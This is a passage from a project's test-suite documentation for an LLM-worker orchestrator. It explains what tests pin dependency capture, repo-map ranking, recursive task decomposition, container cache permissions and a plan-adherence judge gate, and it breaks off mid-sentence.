**extracted** `_state_dir_default` from the launcher rather than
reproducing it as of the N13 follow-up — it had been a hand-copy whose own
docstring cited nine launcher line numbers, every one stale (the block had
moved to `:785-844`), so no change to the launcher could fail it. Those
citations are now corrected in place rather than deleted — they are what
makes the extraction's target legible. It now imports
`_extract_state_dir_block` from `tests/test_resolve_state_dir.py`, the
single owner of that extraction, which has two importers (this file and
`tests/test_launcher_state_mount.py`).

## Dependency capture engine

The capture engine (DESIGN §6½) — `_gather_dep_manifests` (the
manifests-first PRIMARY corpus), `_extract_depcap_commands` (the
install-filtered SECONDARY command hint), `_is_install_command` (the
install-verb filter), `_toml_value`/`_dump_language_installs`
(single-quote-safe TOML persistence), `_merge_setup_packages`,
`capture_repo_deps` (async, with stubbed `claude_p`), the idempotency
sentinel (`dep_capture_done` state field + `<run_dir>/dep_capture.done`
file), and `_backstop_capture_prior_runs` (skips runs with sentinel,
captures runs without) — is tested across four files.

`tests/test_dep_capture_budget.py` covers the extraction+budget unit
(`_extract_depcap_commands`) in focused isolation: dedup, newest-first
ordering, budget gate (`_DEPCAP_TOTAL_BUDGET`), `hit_ceiling` flag
semantics, non-Bash filtering, and malformed-line tolerance. It also
carries the guard-value-that-cannot-guard regression pin (bugfix-004,
incident 2026-07-19): `test_depcap_budgets_not_argv_bound_by_source`
asserts via source inspection that the `_DEPCAP_TOTAL_BUDGET` comment
states the dep_capture payload travels over stdin (not argv) and names
`MAX_ARG_STRLEN` rather than the aggregate `ARG_MAX`;
`test_depcap_total_budget_value_unchanged_since_incident` pins
`_DEPCAP_TOTAL_BUDGET`/`_DEPCAP_MANIFEST_TOTAL_BUDGET` unchanged and that
their combined bound still exceeds `MAX_ARG_STRLEN` — safe only because
the payload is stdin-transported (bugfix-001), not argv-bound.

Since DESIGN §6½ moved the worker to a manifests-first corpus,
`_extract_depcap_commands` now keeps **only install-shaped Bash commands**
(`_is_install_command`) — the install-verb filter and its text-tool-pattern
exclusion (e.g. `grep "apt-get install …"` is dropped) are pinned in
`tests/test_capture_deps.py` (`TestIsInstallCommand`,
`test_filters_to_install_shaped_only`,
`test_excludes_install_verb_inside_text_tool_pattern`), alongside
`_gather_dep_manifests` (`TestGatherDepManifests`) and `_toml_value` /
`_dump_language_installs` (`TestTomlValue`, including the both-quote
single-quoted-command TOML-validity regression).

`tests/test_capture_deps.py` covers the integration against a synthetic
JSONL fixture in the `_iter_log_tool_use` shape: absence pins
(`TestRegexPathAbsent`) that assert the four deleted regex-path symbols no
longer exist on the module (so the regex path can never silently return);
command extraction, budget ceiling truncation, merger union/no-op/
never-clobber, schema-validated worker output → setup_packages +
language_installs write, committed-Dockerfile skip, write-failure
non-fatal, and opt-out. It also pins the `--recapture --force`
wholesale-replace path (`replace=True` drops deps no longer captured; an
empty capture leaves the existing config untouched) alongside the default
union. Source-coupling guards in the same file pin that `main()`'s
`KeyboardInterrupt` and `InterruptedBySignal` handlers each invoke
`capture_repo_deps` (the cancel-arm seam — the fix is inert without the
wiring).

The worker-driven write path specifically — `capture_repo_deps` invoked
with a stubbed `_invoke` returning a fixed structured_output envelope
(mirroring `test_phase_judge.py`'s `_JUDGE_ENVELOPE` pattern) — is
separately covered in `tests/test_dep_capture_worker.py`: schema-validated
output written to `.leerie/config.toml`, warm-repo never-clobber (mtime
unchanged when all deps already present), union append for new packages,
env + config-file opt-out (worker not invoked), committed `.leerie/Dockerfile`
guard (worker not invoked), missing logs dir silent no-op, and non-fatal
write failure. A `TestDepCaptureReplace` class covers the `replace=True`
(`--recapture --force`) path: wholesale-overwrite of
`setup_packages`/`language_installs` (stale deps dropped), an empty
capture leaving the config untouched, and — the regression pin for the
empty-item blanking bug — a schema-valid empty-item capture
(`setup_packages=[""]`, empty-manager `language_installs`) not blanking a
good config.

The `dep_capture` schema contract — required fields, `language_installs`
item shape, valid/invalid instance acceptance, `minLength:1` on
package/manager/command (empty-string rejection), JSON round-trip, and
wiring checks (`WORKER_TYPES` exclusion, effort/model defaults) — is
pinned in `tests/test_dep_capture_schema.py` (mirrors
`test_pr_writer_schema.py`). The model/effort resolution precedence for
`dep_capture` is pinned in `tests/test_resolve_dep_capture_model.py`
(mirrors `test_resolve_models.py` and `test_resolve_efforts.py`).
`dep_capture`'s model override is **env-var-only** — no
`--model-dep-capture` CLI flag and no `model_dep_capture` `leerie.toml`
key (both were removed as dead slots); precedence is per-worker env
(`LEERIE_MODEL_DEP_CAPTURE`) > global CLI > global env > global TOML >
`MODEL_DEFAULT`. The file asserts a stray `args.dep_capture_model` and a
`model_dep_capture` TOML key are **not** honored. Effort: global CLI >
global env > global TOML > `EFFORT_DEFAULT_PER_WORKER["dep_capture"]`. It
also pins the `MODEL_DEP_CAPTURE_ENV` constant, `dep_capture` absent from
`MODEL_DEFAULT_PER_WORKER` (sonnet via the global `MODEL_DEFAULT`
fallback), and present in `EFFORT_DEFAULT_PER_WORKER` with value
`"medium"`.

The three orchestrator wiring seams that are only verifiable by source
inspection are pinned in `tests/test_dep_capture_wiring.py` (mirrors
`test_phase_finalize_capture_hook.py`'s `inspect.getsource` approach):
`main()`'s `KeyboardInterrupt` and `InterruptedBySignal` exit arms each
invoke `capture_repo_deps` inside their own `asyncio.run()` wrapped in a
non-fatal `try/except Exception`; `_run_phases()` calls
`_backstop_capture_prior_runs` before `phase_classify` (the SIGKILL /
crash recovery path); and the `dep_capture` prompt file exists alongside
`SCHEMAS['dep_capture']` (the §12 advisory + code-enforces split).

## P6 repo-map ranking

The P6 ranking contract (DESIGN §5½ (P6)) is pinned in
`tests/test_rank_repo_map.py` across three classes:
`TestSeedNeighborhoodRanking` (seed-adjacent nodes rank above unrelated
nodes — direct seed file, 1-hop neighbor, seed symbol biases definer, all
connected before unrelated, large-graph unrelated cluster at tail);
`TestTokenBudgetEnforcement` (output fits within explicit budget and
within `DEFAULT_CAPS["repo_map_tokens"]` when None; `None` budget equals
the cap value; empty map returns `""`); `TestBinarySearchShrink` (lowering
the budget yields shorter output and fewer files; increasing budgets yield
non-decreasing lengths; 1-token budget yields empty or a single very-short
entry). Fixture is built directly (no `_build_repo_map`) — isolates
ranking. No LLM calls; deterministic.

## P1 recursive decomposition

The P1 recursive decomposition surface (DESIGN §5½ (P1)) is tested across the
files named below. (No count here on purpose: the previous one said "four"
while the section already enumerated seven, and a bare number goes stale on
every addition without anything failing.)

### Sub-file split: the `change_shape` gate, new-file ownership, and `owned_region` enforcement

`tests/test_subfile_split_change_shape_gate.py` pins the three defects behind
run `719c2a26`, where a **one-expression** fix in a 9,140-line file was tiled
into 14 region children.

Replaying that run's actual subtask branches against the merge base is what
turned the diagnosis from inference into measurement, and the numbers are the
reason each pin exists: **11 of 12 region children touched a file outside their
`owned_region`, 7 of 12 edited lines outside their range, and exactly one
(`bugfix-001-f1-r7`) complied.** Four children owning regions thousands of lines
apart all converged on the same ~70 lines — the actual bug site. Two children
independently created the *same* new test file, an add/add conflict on a path
absent from the merge base; verified in a throwaway repo that no strategy
resolves it without discarding a side (`-X ours`/`-X theirs` each silently keep
one). The integration judge caught it, post-merge, and killed the run.

Three causes, three pins:

1. **`_subfile_split` triggered on file *size* alone** (`subfile_split_max_span`,
   700 — 9,140/700 → 14 regions) with no signal about how many sites the change
   needed. Gated now on the planner-declared `change_shape`; only `sweep` tiles.
   The gate is driven and its **return value** asserted, with an anti-vacuity
   twin (same file, same cap, `sweep` → still tiles) so a `_subfile_split` that
   returned `[]` unconditionally cannot pass. A third case pins that an *absent*
   field preserves pre-gate behaviour — `reconciler.added_subtasks` and
   `splitter.children` do not carry it, and defaulting those to "don't split"
   would silently disable the mechanism for them.
2. **`_subfile_child` cloned the parent's whole-file criteria verbatim** into
   all 14 (measured: a single criteria hash, `8b372445`, across all 13 entries
   carrying it in `plan_snapshot` — the 12 surviving region children plus
   `bugfix-001-f2`), and that criterion
   opened *"A new runtime e2e test … reproduces …"*. Exactly one child now owns
   new files; the rest are told **which sibling's id** owns them. Asserted on the
   clause's actual text and the owner's real id, not on presence.
3. **`owned_region` was never checked** — written by `_subfile_split`, rendered
   into the implementer prompt, read back only for re-splitting. Now
   `OWNED_REGION_FILE_ESCAPE` in `check_implementer_output`, driven with r13's
   real shape (one committed file, and not the one it owned).

The **not-fatal** pin is load-bearing and is a retracted-on-measurement record:
routing this through `check_diff_scope`'s return would reach
`fail("broken", …)`, which `_retryable_failure` treats as non-retryable, and
replayed against `719c2a26` that kills **11 of 12** subtasks — converting a
coverage gap into a total run kill. Worse, those violations were children
*obeying* an inherited criterion they could not satisfy in region. The test
asserts the string is absent from `check_diff_scope`'s source and present in
`check_implementer_output`'s, and re-asserts the premise (`"broken"` is still
non-retryable) so the pin fails loudly rather than silently if that changes.

`OWNED_REGION_FILE_ESCAPE` is **gating** where the neighbouring
`NO_PLANNED_FILES_TOUCHED` is advisory, and the distinction is provenance, not
shape: `files_likely_touched` is a planner *guess* (re-driving on it produced a
measured pure-rename commit; tests/test_advisory_signals_match_their_status.py), while
`owned_region["file"]` is code-computed by `_subfile_split`. Two anti-vacuity
pins keep it from firing where it shouldn't — `r7`'s compliant shape, and an
ordinary subtask with no `owned_region` at all.

The **peel and migration-chunk paths** carry the same one-owner rule and are
pinned alongside, because gating the tiling alone would have narrowed the defect
rather than fixed it: `bugfix-001-f2` is a *peel* child, not a region child, and
carries the same criteria hash as all 12 region children — the identical
collision at 2-way. Those children have no `owned_region`, so
`OWNED_REGION_FILE_ESCAPE` cannot back them up and the criteria clause is the
whole mechanism; one pin covers the peel pair, one covers N migration chunks,
one pins that `newfile_owner_id=None` leaves criteria byte-identical, and one
pins that the clause reaches **LLM-authored** chunk labels (the rule lives in
`_migration_child`, not in `_deterministic_chunk_label`, precisely so the
dominant Mode A path is not left uncovered). A fifth re-pins the pre-existing
guarantee that deterministic chunk labels stay distinct per chunk — identical
criteria across children is the shape this whole change exists to prevent.

**Re-entry is pinned separately, and it is the gap that shipped a real bug.**
The first version of this suite tested depth-1 splits only; because each helper
appends its clause to the parent's criteria, a re-split non-owner received both
its parent's "create no new files" and its own "you are the owner", and the
one-owner invariant broke across the tree. Re-entry is not exotic — tier 2
exists for it, and `719c2a26` re-entered three times (`r8`, `r12`, `r14`), so
that run's own data would have produced four claimed owners. Pinned now: a
re-split non-owner mints no owner and keeps naming the original; a re-split
owner passes ownership to exactly one child (the anti-vacuity twin — "never
designate on re-entry" would leave nothing owning new files); the peel of a
non-owner chunk behaves the same; and a whole-tree walk asserts exactly one
owner among the leaves with exactly one clause each. Five of these fail against
the pre-fix behaviour, which is what makes them worth having.

**Tier 1 is stubbed rather than left to the host.** `HAS_TREESITTER` is False on
some dev machines but TRUE on CI (`requirements.txt` pins tree-sitter;
`.github/workflows/test.yml` installs it), so a suite exercising only the tier-2
line-window fallback locally would first meet tier-1 symbol tiling on CI — the
green-locally/red-on-CI shape PR #211 already cost once. Two tests monkeypatch
`_extract_symbol_ranges`, one with an over-cap symbol, which is the actual
re-entry trigger (uniform line-windows can never produce one). The fixture is
sized just over the cap rather than at the incident's 9,140 lines, so CI does
not tree-sitter-parse a 9,000-line file five times for assertions that only
need "more than one region".

Two carry-forward traps are pinned separately: `_migration_child` must carry
`change_shape` (the peel path builds a migration child that **re-enters**
`_subfile_split`, so dropping it routes the dominant dense-file shape — a file
bundled with its test file — straight past the gate), and the gate's
`_NON_SWEEP_CHANGE_SHAPES` frozenset must equal the schema enum minus `sweep`,
so a value added to one and not the other cannot silently become tileable.

`tests/test_fit_judge_schema.py` covers `SCHEMAS["fit_judge"]` — required
fields (`score`, `rationale`, `diffuse`, `confidence`), `score` bounds
(minimum 0, maximum 1), `confidence` using the `"fit"` axis, valid and
invalid instance acceptance, JSON serializability, and wiring (`fit_judge`
in `WORKER_TYPES`, not in `MODEL_DEFAULT_PER_WORKER`,
`EFFORT_DEFAULT_PER_WORKER` entry at `"medium"`, prompt file exists).

`tests/test_splitter_schema.py` covers `SCHEMAS["splitter"]` — `children`
required but with **no `minItems`** (an empty array is the valid answer
"this does not split"; `minItems:1` was removed 2026-08-03 after the
corpus showed the splitter returning `[]` 43 times and a single no-op
child 43 more, every empty return rejected and retried even though
`_recursive_decompose` already accepted it as a leaf), child required
fields (`id`, `title`, `success_criteria_seed`), optional child fields,
valid/invalid instances, JSON serializability, the same wiring guards, no
top-level `files` field (splitter never decides partition), and the child
`requires` array uses the `_REQUIRES_ITEM` shape (tag + extent enum).

`tests/test_resolve_fit_judge_model.py` and
`tests/test_resolve_fit_judge_splitter_model.py` cover model and effort
resolution for `fit_judge` and `splitter` — both in `WORKER_TYPES`; both
absent from `MODEL_DEFAULT_PER_WORKER` (sonnet via global `MODEL_DEFAULT`
fallback); both in `EFFORT_DEFAULT_PER_WORKER` at `"medium"`; per-worker
CLI/env/TOML override chains; isolation (override doesn't bleed to other
workers); structural wiring guards.

`tests/test_partition_files.py` is the dedicated test for
`_partition_files()`: 44 tests across parametrized invariant sweeps (input
sizes 0, 1, 8, 29, 64; chunk-size 1, equals-n, larger-than-n,
partial-last-chunk) plus named telemetry cases — the 29-file migration
sweep and 64-file date-fns sweep that drove the design (LLM silently
dropped 14/29; code-partition is complete by construction). Asserts: 100%
coverage (sum of chunk lengths == len(input)), zero overlap (no file in
two chunks), chunks bounded by chunk_size, and order preserved.

`tests/test_recursive_decompose.py` covers `_recursive_decompose()`
(well-fit subtask is a leaf at score ≥ 0.70, oversized subtask recurses
then children are judged, depth cap terminates at `decompose_max_depth`,
no-progress guard terminates after `decompose_noprogress_rounds`,
migration path uses `_partition_files` for the file→chunk partition and
invokes the splitter only in label-only mode to title each chunk (distinct
titles; deterministic fallback on splitter failure), `st.bump_workers`
called before every `claude_p`, both `claude_p` call sites pass the full
required signature (`cwd`/`autonomous`/`caps` — the C0 regression guard),
and a passed `repo_map` is re-ranked per node and injected into
fit_judge/splitter prompts); it also carries a parallel set of structural
`_partition_files` tests for regression coverage within that file.

`tests/test_recursive_decompose_schedule.py` is the integration test for
the seam between Layer B and the existing scheduler (DESIGN §5½ (P1)
end-of-pipeline claim): leaf ids from `_recursive_decompose` carry a valid
domain prefix so `_schedule()` cross-domain wiring and `_validate_plan`'s
id-prefix check both pass; a ready plan built from stubbed leaves feeds
`_schedule()` and produces the correct topo-sorted wave partition
(independent leaves in wave 0, a dependent leaf in wave 1); and
`_validate_plan` accepts the full leaf set without errors.

The post-ship gap fixes are pinned in `tests/test_recursive_decompose.py`
(C0: `test_recursive_decompose_calls_claude_p_with_full_signature` binds
each `claude_p` call against the real signature so a missing
`cwd`/`autonomous`/`caps` fails; G1:
`..._migration_partition_owns_files_splitter_only_labels`,
`..._migration_children_have_distinct_labels`,
`..._migration_label_fallback_on_splitter_failure`; G2:
`..._injects_repo_map_into_worker_prompts`, `..._no_repo_map_when_none`),
in `tests/test_check_functions.py` (G3:
`test_low_decomposition_quality_does_not_gate`,
`test_low_task_understanding_does_not_gate` — both axes are advisory
self-reports; the independent `task_coverage_judge` is the coverage gate),
and in `tests/test_repo_map_degrade_warning.py`
(G6: `_build_repo_map` warns exactly once per process when source files
exist but the graph is empty, stays quiet for a non-code repo).
`tests/test_repo_map.py` now carries a `HAS_TREESITTER` module skip gate
(G4) mirroring `test_build_repo_map.py`.

## Tree-sitter probe and repo-map gate wiring

`_tree_sitter_extraction_works()` itself — the functional probe the
G4/G6 skip gates and degrade warning both delegate to — is pinned directly
in `tests/test_tree_sitter_probe.py`: the True branch (real, unstubbed
`_parse_repo_file` on a working tree-sitter host) is gated on
`HAS_TREESITTER` so it skips rather than fails on an incompatible host;
the two False branches — `_parse_repo_file` raising (simulates an
installed-but-incompatible language-pack version lacking `process()`) and
`_parse_repo_file` returning `([], [])` (extracts nothing) — are
host-independent and always run, since they are the load-bearing proof
that the probe fails closed regardless of the local tree-sitter install
state.

Because the actual G6 warning previously named only two possible causes
("unavailable or incompatible") with no way to tell which, or to see the
real underlying error, `_parse_repo_file` now stashes a short diagnostic
(`f"{type(e).__name__}: {e}"`) in the module-level `_last_parse_error` on
an actual caught exception (not on a plain unsupported-extension miss),
and `_warn_repo_map_empty_once()` appends it to the warning as
`" Probe failure: <type>: <message>"` when present. `test_tree_sitter_probe.py`
pins that the raising branch populates `_last_parse_error` with the exact
exception text and that the empty-result branch (no exception at all)
leaves it `None` — the distinction that keeps the parenthetical from
appearing on the legitimately-quiet path. `test_repo_map_degrade_warning.py`
adds the end-to-end pins: `test_warning_includes_probe_exception_detail`
(a probe-only raise surfaces `"Probe failure:"` plus the exception type
and message in the logged warning) and
`test_no_probe_detail_when_empty_result_is_not_an_exception` (the existing
plain empty-graph path grows no spurious detail).

A related production failure surfaced the root cause for the `/tmp/.cache`
fix below: `RuntimeError: Download cache lock error: create cache dir
/tmp/.cache/tree-sitter-language-pack/v1.12.5: Permission denied (os error
13)`. Root cause (verified live against both the pre-fix and fixed image
via the real `unshare --user --map-user=$(id -u leerie)` mechanism
container-entry.sh uses under rootless containerd): that unshare remaps
only outer UID 0 -> inner leerie, so a directory explicitly chowned to
leerie's own (non-zero) UID is NOT covered by the remap and appears owned
by nobody/65534 to the privilege-dropped process: traversable via mode-755
"other" bits, but not writable. This is the same bug class already hit for
corepack (`COREPACK_HOME`, worked around with its own dedicated
bind-mounted cache dir rather than fixed at the source) — chasing each
offending tool down individually doesn't scale, so the fix instead makes
`/tmp/.cache` itself world-writable with the sticky bit (mirroring `/tmp`'s
own `drwxrwxrwt`) at both the Dockerfile (build time, the layer rootless
runs rely on exclusively) and `container-entry.sh` (a runtime safety net
for the rootful/Fly path, mirroring the existing `chown` pattern there).
`tests/test_tmp_cache_writable.py` pins both sites source-coupled
(mirroring `test_rootless_host_uid.py`'s extraction style): the
Dockerfile's build RUN step and `container-entry.sh`'s rootful-guard block
both carry `chmod -R a+rwX /tmp/.cache` + `chmod 1777 /tmp/.cache` after
the existing `chown`, and the runtime chmod specifically lives *inside*
the `ROOTLESS != true` guard (rootless has no runtime fixup path and
relies on the image's baked-in mode alone).

The same bug class hit `/home/leerie/.local`, `.cache`, and `.gnupg`
directly (`pip install --user` failing with `EACCES: /home/leerie/.local/lib`),
fixed in `tests/test_home_leerie_ownership.py` (same source-coupling
style, but a chown-back rather than a chmod-world-writable, since these
are a fixed set of pre-created dirs rather than an arbitrary-tool
`XDG_CACHE_HOME`): the Dockerfile's `mkdir` block for these dirs carries
no `chown` (root-owned, which is what maps correctly through the rootless
remap — the same mechanism that already makes bind-mounted host dirs
writable with no chown), `chmod 700 /home/leerie/.gnupg` is kept, and
`container-entry.sh`'s rootful-guard block chowns `/home/leerie`,
`.local`, `.cache`, and `.gnupg` to `leerie` at runtime instead (needed
there since the rootful `runuser -u leerie` drop is a real UID switch, not
a remap). A dedicated test asserts the `/tmp/.cache` fix above is
unchanged by this.

The gate *wiring* itself — as opposed to the probe's own runtime contract
— is pinned in `tests/test_repo_map_gate_wiring.py` via source-coupling
assertions (mirroring `test_dep_capture_wiring.py`):
`conftest._has_treesitter()`'s source references
`_tree_sitter_extraction_works` (proving delegation to the functional
probe, not a bare `ImportError` check); `conftest` exposes a module-level
`HAS_TREESITTER` bool; and each of `test_build_repo_map.py`,
`test_repo_map.py`, `test_phase_plan_repo_map_ctx.py` both imports
`HAS_TREESITTER` from `tests.conftest` and contains a `skipif` referencing
it (module- or class-level — `test_phase_plan_repo_map_ctx.py` gates only
its `TestRepoMapEnabled` class). This guards against reverting to an ImportError-only gate or dropping
the skipif from one file, either of which re-introduces the 19-test
host-sensitive failure with no other signal.

## P6/P1 caps and wiring

The four new `DEFAULT_CAPS` values introduced by the F1 P6+P1 work are
pinned in `tests/test_decompose_caps.py`: `repo_map_tokens==1000`,
`decompose_max_depth==5`, `decompose_fit_threshold==0.70` (with a comment
citing F1-build-measure.md — the 0.95 value it replaced over-splits 100%
of well-fit subtasks), and `decompose_noprogress_rounds==2`. Mirrors the
`test_default_cap_is_eight` pattern from `test_resolve_confidence_rounds.py`.

The P6 repo-map builder is pinned in two files. `tests/test_repo_map.py`
covers `_build_repo_map` (symbol/def extraction, class methods, ref edges,
relative-path keys, empty-repo, skip-.git/node_modules), the mtime cache
(dir created on first use, unchanged file served from cache sentinel,
changed file re-parsed, only-changed file re-parsed), `_rank_repo_map`
(string result, token-budget fits, seed-file/seed-symbol bias, empty map,
determinism, very-tight budget), `_parse_repo_file` (unsupported
extension, markdown, python defs + refs), `_walk_calls` (bare call
extracted, attribute call not extracted), and `_pagerank` (dangling node,
personalization, empty). `tests/test_build_repo_map.py` (added by subtask
test-001) provides a focused HAS_TREESITTER-gated supplement: symbol graph
(defs, class defs, ref edge, keys shape, relative-path invariant), mtime
cache (cache dir created, sentinel cache hit, changed file re-parsed,
only-changed file re-parsed with sentinel for unchanged), and graceful
degrade (empty file, binary file, empty repo, skip-.git/node_modules).
Uses a `pytestmark` module-level skip gate so CI without
tree-sitter-language-pack skips all tests cleanly.

The P6 Layer A wiring — `phase_plan` ctx injection — is tested in
`tests/test_phase_plan_repo_map_ctx.py`: repo-map enabled path (ctx
contains `repo_map` string, non-empty, JSON-serializable, contains known
symbol names, seed_files from `task_file_items` respected); skip path (ctx
omits `repo_map`, baseline keys present, values match inputs); empty-repo
degrade (`_rank_repo_map` returns `""` → key omitted); exception-swallow
degrade (`_build_repo_map` raises → exception caught, ctx emitted without
`repo_map`).

The P1 Layer C wiring — `phase_plan` recursion expansion — is tested in
`tests/test_phase_plan_recursion_wiring.py`: source-coupling guard
(`phase_plan` source contains `_recursive_decompose(` at depth=0,
reassigns `plan["subtasks"] = leaves`, expansion loop precedes final
logging); integration — one oversized subtask (stubbed
`_recursive_decompose` → two leaves) → `plan["subtasks"]` has 2 entries;
two first-pass subtasks → `_recursive_decompose` called once per subtask;
well-fit leaf pass-through (stub returns input unchanged →
single-element `plan["subtasks"]`); empty-subtasks plan not touched
(`_recursive_decompose` never called, subtasks stays `[]`).

## Plan-instruction-adherence gate

The plan-instruction-adherence gate's worker registration (schema,
prompt, model/effort defaults) is tested in two files mirroring the
`fit_judge`/`splitter` pair above. `tests/test_adherence_judge_schema.py`
covers `SCHEMAS["adherence_judge"]` — required fields
(`user_prescribed_a_procedure`, `instruction_adherence`, `violations`,
`rationale`), `instruction_adherence` bounds (0–10), the deliberate
absence of a nested `confidence` sub-object (this worker is itself the
independent check that replaces a self-report, so a self-confidence axis
would reintroduce the self-grading bias the gate exists to remove),
instance acceptance, JSON serializability, and wiring (`adherence_judge` in
`WORKER_TYPES`, absent from `MODEL_DEFAULT_PER_WORKER` so it resolves to
sonnet, `EFFORT_DEFAULT_PER_WORKER` entry at `"medium"`, prompt file exists).
`tests/test_resolve_adherence_judge_model.py` covers the model/effort
resolution precedence chain (mirrors `test_resolve_fit_judge_model.py`),
asserting the sonnet default. **History:** an earlier Sonnet generation
was empirically falsified here (false-positived a legitimate plan), which
required pinning this worker to opus, and a separate opus
*understanding*-framed judge rubber-stamped the incident too (only the
ADHERENCE frame was validated, independent of tier). Both gaps are
understood to have closed for Sonnet 5 (DESIGN §5 *Opus-judgment,
sonnet-workhorse (historical)*); re-run the calibration before
reintroducing a per-worker opus override if this gate ever regresses.

### Deterministic prescribed-command-coverage floor

The deterministic PRIMARY layer of the same gate,
`check_prescribed_command_coverage(prescribed_procedure, subtasks) ->
list[str]` (pure JSON→verdict set logic, no NL parsing), is tested in
`tests/test_prescribed_cmd_coverage.py`: the motivating incident shape
(prescribed `recon browser`/`recon generate`, no subtask's `runs_commands`
covers either → both fire), a goal-only task (`is_prescribed=false` or
`commands=[]`, including `None`/`{}`) staying silent, paraphrase coverage
(normalized lowercased/stopword-filtered token-SUBSET matching, e.g.
"barnacle recon browser" covers "recon browser" — not exact string
equality), full/partial coverage, no-subtasks-at-all firing for every
prescribed command, tolerance of missing/empty `runs_commands` and of
non-string/blank prescribed commands, case-insensitivity, and a negative
control proving a shared-stopword-only overlap doesn't falsely mark a
command covered. The gate's advisory-vs-gating outcome — distinct from
the G3 `decomposition_quality`/`task_understanding` pair (the *planner's*
self-report axes, not the adherence floor) — is pinned in
`tests/test_check_functions.py`'s `TestAdherenceGateAdvisoryVsGating`: a
prescribed-and-uncovered command gates (`PRESCRIBED_CMD_UNRUN`), a
goal-only task and a fully-covered command never gate, and
`check_planner_output` carries no separate adherence axis to demote,
since the floor is wired only into `phase_adherence_gate`.

### Task-coverage gate (advisory) and migration_targets cross-check

The task-coverage gate is **advisory** (2026-08-04). Its deterministic
floor, `check_required_items_coverage`, was deleted: it required one
subtask's token set to be a SUPERSET of a required item's, and across
every run that ever carried `required_items` it passed **0 of 102
items** — a 100% false-positive rate with no true negative. It also
violated the *Language-to-JSON* rule, since `required_items` are
LLM-written sentences. Its judge is retained but non-terminal: re-invoked
on identical input it returned a different finding set 85% of the time
(n=20), intersection across samples empty. `tests/test_phase_planning_coverage_gate.py`
pins the advisory contract and the floor's absence.

`migration_targets` carries a gap of the same shape — optional on the
subtask schema, silently no-op when a planner omits it — closed by a
narrow, same-worker cross-check: `performs_replacement: bool` on the
subtask schema (sibling, not nested inside `migration_targets` —
`additionalProperties: False` forces this), and
`_check_migration_targets_declared(subtasks)` flags
`MIGRATION_TARGETS_MISSING` when `performs_replacement=true` but
`migration_targets` is empty. Tested in `tests/test_migration_surface.py`'s
`TestCheckMigrationTargetsDeclared` (contradiction fires, both-empty and
both-populated stay silent, independent per-subtask evaluation) and
`TestPerformsReplacementSchema` (field shape, optional, sibling-not-nested).
Explicitly **not an independent witness** (DESIGN §8 and the check
function's own docstring): both signals come from the same
non-adversarial planner self-report, so it closes "forgot to fill the
field," not "consistently wrong on both fields."

### phase_adherence_gate wiring and end-to-end regression

The gate wiring — `phase_adherence_gate`, run after `phase_overlap_judge`
and before `_schedule()`/`_validate_plan`, composing the deterministic
floor and the `adherence_judge` behind `_run_checked_loop` — is tested in
`tests/test_phase_adherence_gate.py` (22 tests): source-coupling wiring
pins (floor+judge both run; a low result routes through the retry path
via a re-invoked `phase_plan`; a `WorkerError` never discards the plan;
call site precedes `_schedule()`/`_validate_plan`, ordered after
`phase_overlap_judge`) and behavioral tests against stubbed
`claude_p`/`phase_plan` (skip-flag and not-prescribed short-circuits;
clean plan passing without re-plan; low-adherence round triggering
exactly one re-plan that converges; exhaustion `die()`ing with unresolved
violations; the two `WorkerError`-every-round degrades — clean floor
unmodified, violating floor still `die()`ing).

The two-stage gate's composed end-to-end behavior is locked separately in
`tests/test_adherence_gate_e2e.py`: a synthetic incident shape (prescribed
`[foo:build, foo:generate]`, no subtask covers `foo:generate`) drives
`check_prescribed_command_coverage` directly to prove the floor fires
first, then drives the full `phase_adherence_gate` (opus `adherence_judge`
stubbed, mirroring `test_dep_capture_worker.py`'s `_invoke` stub) to prove
it re-plans exactly once and converges on a plan the floor accepts; a
synthetic ordinary shape (`prescribed_procedure` absent or
`is_prescribed=false`) proves zero `claude_p`/`phase_plan` calls — the
corpus-validated 0/21-false-positive result this gate protects.

The empirical calibration behind the threshold — real opus judge runs
against the cruiselines incident plan and a 21-run corpus, finding
`is_prescribed=true AND (floor violation OR low adherence)` fires on the
incident and stays silent on ordinary goal-only tasks with 0 false
positives — is frozen as a no-live-LLM fixture in
`tests/test_adherence_gate_regression.py`, distinct from
`test_prescribed_cmd_coverage.py` (floor in isolation) and
`test_phase_adherence_gate.py` (phase wiring): canned classifier/planner
JSON under `tests/fixtures/adherence_gate/{incident_plan,legit_plan}.json`
drives both the floor and the full two-stage composition. Pinned: issue
count on both fixtures; incident floor naming both unrun commands; legit
floor silent; incident fixture `die()`ing after exhausting the re-plan
budget; legit fixture never invoking `claude_p`/`phase_plan` at all; and a
frozen-score separation test (`test_incident_vs_legit_judge_scores_are_cleanly_separated`)
catching threshold drift even when the fire/silent outcome doesn't change.

### Source-of-truth delivery: a fixture that pinned one branch and reported both

`tests/test_gather_answers_validation.py` asserted the source-of-truth
contract across all three values and passed, while its `state` fixture
hardcoded `"needs_source_of_truth": True` — exercising only the branch
where the classifier flagged the question. On the other branch
`gather_answers` wrote nothing and consumers fell back to a **hardcoded
`"codebase"` literal**, silently overriding an explicit
`--source-of-truth research`; measured, 74 of 196 corpus runs took it.
The fixture is now parametrized over both values: reintroducing the
guard fails 6 tests, all on `no_needs_sot`, including
`[no_needs_sot-codebase]`, since under the guard `gather_answers` writes
no key and the lookup raises. **The trap that a `codebase`-only
assertion is answered by the very literal it exists to remove lives one
layer down, in the consumers** (`phase_plan` / `_write_plan` /
`_compose_pr_via_llm`), which `tests/test_source_of_truth_delivery.py`
targets — its spec-file check loops over `research` too, and its
`_effective_source_of_truth` table carries a row where `answers` and the
preference *disagree* (an agreeing-only table passes a helper that
ignores `answers`). The delivery file also source-couples three of the
four `State`-holding consumers (`phase_plan`, `_write_plan`,
`_compose_pr_via_llm`) to `_effective_source_of_truth(st)` (only the
first two ever carried a `"codebase"` default, so the third only fails
on presence — parametrized anyway as a forward guard). The fourth reader
is `phase_reconcile`'s, nested in the `_check_unresolvable` closure and
pinned by `tests/test_unresolvable_die_message.py` via AST-resolved
binding. **That the count here reads "four" at all is a guard's product,
not care's**: this doc said "all three" while the fourth reader landed in
the same commit, unnoticed until `tests/test_effective_sot_consumers.py`
derived the set from the call sites — an enumeration nested inside a
closure is invisible to an AST walk over module-level `def` bodies alone.
Two further readers can't use the helper and are documented instead:
`compose_pr_body` takes a plain `state: dict`, and
`scripts/host-finalize.sh` reads the key with `jq` — pinning the writer
alone leaves the value reaching nothing (the **deleted**
`test_resolve_aws_prefs.py` trap).

### Unresolvable-die message and reconciler payload field drift

`tests/test_unresolvable_die_message.py` covers the phase-2½ abort text
as behaviour, not cosmetics: against 5 simulated operators given a real
failure, the old wording sent **5 of 5** to widen the scope fence and
**0 of 5** to remove the offending criterion — the reverse of the correct
